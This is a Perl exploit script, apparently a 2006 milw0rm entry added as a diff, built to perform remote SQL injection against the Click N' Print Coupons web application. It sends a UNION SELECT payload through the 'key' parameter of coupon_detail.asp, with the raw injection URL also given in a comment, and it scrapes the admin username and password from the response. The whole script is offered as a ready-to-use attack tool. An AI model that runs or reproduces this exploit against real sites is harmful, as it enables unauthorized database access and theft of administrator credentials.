@@ -1,0 +1,103 @@
+#!/usr/bin/perl
+#[Script Name: Click N' Print Coupons <= V2005.01 (key) Remote SQL Injection Exploit
+#[Coded by   : ajann
+#[Author     : ajann
+#[Contact    : :(
+#[S.Page     : http://www.websitedesignsforless.com
+#[$$         : $9.95
+#[Message    : Tum Musluman Aleminin Kurban Bayrami Mubarek Olsun #..
+#[..         : ajann,Turkey
+
+# 2006.01 //coupon_detail.asp?key=-1%20union%20select%200,0,xusername,0,0,xpassword,0,0,0,0,0,0,0,0,0%20from%20login%20where%20id%20like%201
+
+
+use IO::Socket;
+if(@ARGV < 1){
+print "
+[========================================================================
+[//  Click N' Print Coupons <= V2005.01 (key) Remote SQL Injection Exploit
+[//                   Usage: exploit.pl [target]
+[//                   Example: exploit.pl victim.com
+[//                   Example: exploit.pl victim.com
+[//                           Vuln&Exp : ajann
+[========================================================================
+";
+exit();
+}
+#Local variables
+$server = $ARGV[0];
+$server =~ s/(http:\/\/)//eg;
+$host = "http://".$server;
+$port = "80";
+$file = "/coupon_detail.asp?key=";
+
+print "Script <DIR> : ";
+$dir = <STDIN>;
+chop ($dir);
+
+if ($dir =~ /exit/){
+print "-- Exploit Failed[You Are Exited] \n";
+exit();
+}
+
+if ($dir =~ /\//){}
+else {
+print "-- Exploit Failed[No DIR] \n";
+exit();
+ }
+
+print "User <ID>    : ";
+$ID = <STDIN>;
+chop ($ID);
+
+if ($ID =~ /exit/){
+print "-- Exploit Failed[You Are Exited] \n";
+exit();
+}
+
+$len=length($ID);
+
+if ($len == 1){}
+else {
+print "-- Exploit Failed[No User Id] \n";
+exit();
+ }
+
+$target = "-1%20union%20select%200,0,0,xusername,xpassword,0,0,0,0,0,0,0,0,0%20from%20login%20where%20id%20like%20".$ID;
+$target = $host.$dir.$file.$target;
+
+#Writing data to socket
+print "+**********************************************************************+\n";
+print "+ Trying to connect: $server\n";
+$socket = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$server", PeerPort => "$port") || die "\n+ Connection failed...\n";
+print $socket "GET $target HTTP/1.1\n";
+print $socket "Host: $server\n";
+print $socket "Accept: */*\n";
+print $socket "Connection: close\n\n";
+print "+ Connected!...\n";
+#Getting
+while($answer = <$socket>) {
+if ($answer =~ /color=\"#FF0000\">(.*?)<\/font>/){
+print "+ Exploit succeed! Getting admin information.\n";
+print "+ ---------------- +\n";
+print "+ Username: $1\n";
+}
+
+if ($answer =~ /<font size=\"4\"><b>(.*?)<br>/){
+print "+ Password: $1\n";
+}
+
+if ($answer =~ /Syntax error/) { 
+print "+ Exploit Failed : ( \n";
+print "+**********************************************************************+\n";
+exit(); 
+}
+
+if ($answer =~ /Internal Server Error/) {
+print "+ Exploit Failed : (  \n";
+print "+**********************************************************************+\n";
+exit(); 
+}
+ }
+
+# milw0rm.com [2006-12-30]
